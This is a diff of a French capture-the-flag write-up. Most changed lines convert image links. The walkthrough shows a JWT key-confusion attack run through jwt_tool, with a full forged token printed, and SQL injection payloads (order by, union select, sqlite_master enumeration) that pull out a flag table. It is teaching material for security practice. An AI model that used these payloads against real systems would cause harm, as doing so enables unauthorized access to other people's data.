@@ -144,14 +144,16 @@ V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
 	* -pv : valeur
 
 Résultat
-![[Pasted image 20240518192128.png]]
+![Pasted image 20240518192128](https://github.com/Zelofane22/CTF-Challenge/assets/80983303/b21f6e5c-d06b-4ec9-a615-212b12721c75)
+
 Il suffit de modifier le token dans la requête avec burpsuite et on a un résultat qui correspond à cette partie du fichier *routes/index.js*
 ```node
 if (user === undefined) {
   return res.send(`user ${req.data.username} doesn't exist in our database.`);
 }
 ```
-![[Pasted image 20240518192956.png]]
+![Pasted image 20240518192956](https://github.com/Zelofane22/CTF-Challenge/assets/80983303/69f1510e-cd2c-49f4-8515-f8d61571f78b)
+
 Maintenant que nous pouvons interagir librement avec la base de données nous allons passer à la phase d'injection sql.
 ## injection sql
 ### Découverte du nombre de colonnes
@@ -159,14 +161,17 @@ A la place de `dine` je vais mettre `zelofane' order by 2-- -` puis 3, 4 ainsi d
 ```
 python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRpbmUiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE3MTYwNjcwMjN9.mLkZFyrlJEPo_ZcRqY-PcPrpwv6pSs1zgrxlFI1mbRocvlnuGweSxForrgmE4jrOPVd150UsHVNEAi_CZOArwKV1_baFSk_vvDR2M0s9JEaT3p8MdVD0EkVNvppmH8SuiejcIjJGkNYraOcryBVt0-5r1n0O0VQ--NsbiyYFJq2bb_5QBAyGwgX4289P8Bqr-XPDgTK1vMB4yIrstBCvZBhzicHScnrVdgdSRWJJBDOLGKX87POoO0S7Sln7Fe9QaZaJ2Oo_XmeFdl-D0y3H4E0u7dnMyGkvtW59UqdlRS6v1AmbGDmarLSkysHAvdSKI4szwWL1pJZo02EeuqHO8w -X k -pk ./pubkey.pem -I -pc username -pv "zelofane' order by 4-- -"
 ```
-![[Pasted image 20240518200546.png]]
+![Pasted image 20240518200546](https://github.com/Zelofane22/CTF-Challenge/assets/80983303/f117dd2a-8284-41b4-8871-5602f5d72a16)
+
 
 Nous avons 3 colonnes. Je vais vérifier le numéro de colonne des noms d'utilisateurs avec le payload : `' union select 1,2,3-- -`
-![[Pasted image 20240518203225.png]]
+![Pasted image 20240518203225](https://github.com/Zelofane22/CTF-Challenge/assets/80983303/7b8577c4-375c-4f18-93f7-72c63889e49b)
+
 La colonne des nom d'utilisateurs est donc le numéro 2.
 
 Maintenant je vais vérifier la structure de la base de données avec : `' union select 1,sql,3 from sqlite_master-- -`
-![[Pasted image 20240518211038.png]]
+![Pasted image 20240518211038](https://github.com/Zelofane22/CTF-Challenge/assets/80983303/9f0b562a-deab-458d-ae8d-f148e2cd651c)
+
 On a donc le nom de la table et des colonnes
 Il ne reste plus qu'a récupérer les informations de la table : `' union select 1,GROUP_CONCAT(top_secret_flaag),3 FROM flag_storage-- -`
 
